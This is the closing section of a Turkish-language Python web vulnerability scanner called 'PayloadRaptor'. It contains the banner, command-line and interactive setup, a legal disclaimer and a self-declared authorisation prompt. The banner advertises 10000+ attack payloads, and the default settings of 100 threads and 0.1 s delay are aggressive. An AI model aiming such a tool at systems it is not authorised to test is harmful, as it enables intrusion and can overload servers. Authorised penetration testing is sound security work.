██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝███████║██████╔╝   ██║   ██║   ██║██████╔╝
██╔══██╗██╔══██║██╔═══╝    ██║   ██║   ██║██╔══██╗
██║  ██║██║  ██║██║        ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{Renkler.RESET}

{Renkler.ACIK_MAVI}🦖 PayloadRaptor - Güçlü Web Güvenlik Açığı Avcısı v3.0{Renkler.RESET}
{Renkler.MAVI}👨‍💻 Geliştirici: Muhammed Cengiz{Renkler.RESET}
{Renkler.KIRMIZI}⚡ Hızlı, Güçlü ve Ölümcül Payload Testleri{Renkler.RESET}
{Renkler.SARI}🎯 20 Farklı Saldırı Vektörü | 10000+ Test Payload'ı{Renkler.RESET}
{Renkler.YESIL}🛡️ Eğitim ve Penetrasyon Testi Amaçlıdır{Renkler.RESET}

{Renkler.KIRMIZI}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Renkler.RESET}
{Renkler.SARI}⚠️  UYARI: Bu araç sadece yasal penetrasyon testleri için kullanılmalıdır! Sunucuya saniyeler içinde 10000 istek gönderilecektir! Dikkatli kullanın!{Renkler.RESET}
{Renkler.KIRMIZI}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Renkler.RESET}
"""
    print(banner)

def main():
    """Ana fonksiyon"""
    # Banner göster
    banner_goster()
    
    # Bağımlılıkları yükle
    bagimliliklari_yukle()
    
    # Komut satırı argümanları kontrolü
    if len(sys.argv) > 1:
        # CLI modu
        parser = argparse.ArgumentParser(
            description="🛡️ Gelişmiş Web Güvenlik Açığı Tarayıcısı - Muhammed Cengiz",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog=f"""
{Renkler.ACIK_MAVI}Kullanım Örnekleri:{Renkler.RESET}
  python {sys.argv[0]} -u https://example.com/login -p username password
  python {sys.argv[0]} -u https://api.example.com/search -p q --timeout 20
  python {sys.argv[0]} -u https://example.com/form -p input1 input2 --output rapor.json

{Renkler.SARI}⚠️  Bu araç sadece yetkili güvenlik testleri için kullanılmalıdır!{Renkler.RESET}
            """
        )
        
        parser.add_argument("-u", "--url", required=True, help="Hedef URL")
        parser.add_argument("-p", "--parameters", nargs="+", required=True, help="Test edilecek parametreler")
        parser.add_argument("--timeout", type=int, default=15, help="İstek zaman aşımı (varsayılan: 15)")
        parser.add_argument("--delay", type=float, default=0.1, help="İstekler arası gecikme (varsayılan: 0.1)")
        parser.add_argument("--workers", type=int, default=100, help="İşçi thread sayısı (varsayılan: 100)")
        parser.add_argument("--output", help="JSON rapor çıktı dosyası")
        parser.add_argument("--no-ssl-verify", action="store_true", help="SSL doğrulamasını devre dışı bırak")
        parser.add_argument("--user-agent", default="GuvenlikTarayicisi-MuhammedCengiz/3.0", help="Özel User-Agent")
        parser.add_argument("--verbose", "-v", action="store_true", help="Detaylı loglama")
        
        args = parser.parse_args()
        
        if args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        
        # URL doğrula
        if not url_dogrula(args.url):
            print(f"{Renkler.KIRMIZI}❌ Geçersiz URL formatı!{Renkler.RESET}")
            sys.exit(1)
        
        hedef_url = args.url
        parametreler = args.parameters
        timeout = args.timeout
        gecikme = args.delay
        worker_sayisi = args.workers
        user_agent = args.user_agent
        ssl_dogrula = not args.no_ssl_verify
        cikti_dosyasi = args.output
        
    else:
        # İnteraktif mod
        print(f"{Renkler.ACIK_MAVI}📋 Tarama yapılandırması girin:{Renkler.RESET}\n")
        
        # Hedef URL al  
        while True:
            hedef_url = input(f"{Renkler.MAVI}🎯 Hedef URL (örnek: https://example.com/login): {Renkler.RESET}").strip()
            if url_dogrula(hedef_url):
                break
            print(f"{Renkler.KIRMIZI}❌ Geçersiz URL formatı! Lütfen geçerli bir URL girin.{Renkler.RESET}")
        
        # Parametreleri al
        param_input = input(f"{Renkler.MAVI}📝 Test edilecek parametreler (virgülle ayırın, örnek: username,password,email): {Renkler.RESET}").strip()
        parametreler = [p.strip() for p in param_input.split(',') if p.strip()]
        
        if not parametreler:
            print(f"{Renkler.KIRMIZI}❌ En az bir parametre belirtmelisiniz!{Renkler.RESET}")
            sys.exit(1)
        
        # Gelişmiş ayarlar
        print(f"\n{Renkler.SARI}⚙️  Gelişmiş Ayarlar (Enter ile varsayılanları kullan):{Renkler.RESET}")
        
        timeout_input = input(f"{Renkler.ACIK_MAVI}⏱️  İstek timeout'u (varsayılan: 15): {Renkler.RESET}").strip()
        timeout = int(timeout_input) if timeout_input.isdigit() else 15
        
        gecikme_input = input(f"{Renkler.ACIK_MAVI}⏸️  İstekler arası gecikme (varsayılan: 0.3): {Renkler.RESET}").strip()
        gecikme = float(gecikme_input) if gecikme_input else 0.3
        
        worker_input = input(f"{Renkler.ACIK_MAVI}🧵 Thread sayısı (varsayılan: 100): {Renkler.RESET}").strip()
        worker_sayisi = int(worker_input) if worker_input.isdigit() else 100

        user_agent = "GuvenlikTarayicisi-MuhammedCengiz/3.0"
        ssl_dogrula = True
        cikti_dosyasi = None
        
        cikti_input = input(f"{Renkler.ACIK_MAVI}💾 JSON raporu kaydet? (dosya adı veya Enter): {Renkler.RESET}").strip()
        if cikti_input:
            cikti_dosyasi = cikti_input
    
    # Yasal uyarı göster
    print(f"\n{Renkler.KALIN}{Renkler.KIRMIZI}=" + "="*80 + f"{Renkler.RESET}")
    print(f"{Renkler.KALIN}{Renkler.KIRMIZI}🚨 YASAL UYARI VE SORUMLULUK REDDİ{Renkler.RESET}")
    print(f"{Renkler.KALIN}{Renkler.KIRMIZI}=" + "="*80 + f"{Renkler.RESET}")
    print(f"{Renkler.SARI}Bu araç sadece yetkili güvenlik testleri ve eğitim amaçlı geliştirilmiştir.{Renkler.RESET}")
    print(f"{Renkler.SARI}Test ettiğiniz sistemler için uygun yetkilere sahip olduğunuzdan emin olun.{Renkler.RESET}")
    print(f"{Renkler.SARI}Yetkisiz testler yasalara ve düzenlemelere aykırı olabilir.{Renkler.RESET}")
    print(f"{Renkler.SARI}Yapımcı Muhammed Cengiz, bu aracın kötüye kullanımından sorumlu değildir.{Renkler.RESET}")
    print(f"{Renkler.KALIN}{Renkler.KIRMIZI}=" + "="*80 + f"{Renkler.RESET}")
    
    yanit = input(f"\n{Renkler.MAVI}Bu sistemi test etmek için yetkiniz var mı? (evet/hayır): {Renkler.RESET}").strip().lower()
    if yanit not in ["evet", "yes", "e", "y"]:
        print(f"{Renkler.KIRMIZI}❌ Çıkılıyor. Lütfen bu aracı kullanmadan önce uygun yetkilere sahip olduğunuzdan emin olun.{Renkler.RESET}")
        sys.exit(0)
    
    # Tarama yapılandırması oluştur
    yapilandirma = TaramaYapilandirmasi(
        hedef_url=hedef_url,
        parametreler=parametreler,
        timeout=timeout,
        istekler_arasi_gecikme=gecikme,
        max_worker=worker_sayisi,
        user_agent=user_agent,
        ssl_dogrula=ssl_dogrula
    )
    
    print(f"\n{Renkler.YESIL}🚀 Güvenlik taraması başlatılıyor...{Renkler.RESET}")
    print(f"{Renkler.ACIK_MAVI}   🎯 Hedef: {hedef_url}{Renkler.RESET}")
    print(f"{Renkler.ACIK_MAVI}   📝 Parametreler: {', '.join(parametreler)}{Renkler.RESET}")
    print(f"{Renkler.ACIK_MAVI}   🧵 Thread Sayısı: {worker_sayisi}{Renkler.RESET}")
    print(f"{Renkler.ACIK_MAVI}   ⏱️  Timeout: {timeout}s{Renkler.RESET}")
    print()
    
    # Tarayıcı oluştur ve çalıştır
    tarayici = GuvenlikTarayicisi(yapilandirma)
    sonuclar = tarayici.tara()
    
    # Raporları üret
    rapor_ureticisi = RaporUreticisi(sonuclar, yapilandirma, tarayici.test_sayisi, tarayici.basarili_saldiri_sayisi)
    rapor_ureticisi.konsol_raporu_uret()
    
    if cikti_dosyasi:
        rapor_ureticisi.json_raporu_uret(cikti_dosyasi)
    
    # Uygun çıkış kodunu döndür
    if sonuclar:
        print(f"\n{Renkler.KIRMIZI}⚠️  {len(sonuclar)} güvenlik açığı tespit edildi!{Renkler.RESET}")
        print(f"{Renkler.SARI}Bu sonuçları güvenlik ekibi ile paylaşın ve gerekli önlemleri alın.{Renkler.RESET}")
        sys.exit(1)  # Güvenlik açıkları bulundu
    else:
        print(f"\n{Renkler.YESIL}✅ Tebrikler! Sistem güvenli görünüyor.{Renkler.RESET}")
        print(f"{Renkler.ACIK_MAVI}Düzenli güvenlik testleri yapmaya devam edin.{Renkler.RESET}")
        sys.exit(0)  # Güvenlik açığı bulunamadı

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Renkler.SARI}🛑 Kullanıcı tarafından durduruldu.{Renkler.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Renkler.KIRMIZI}❌ Beklenmeyen hata: {e}{Renkler.RESET}")
        sys.exit(1)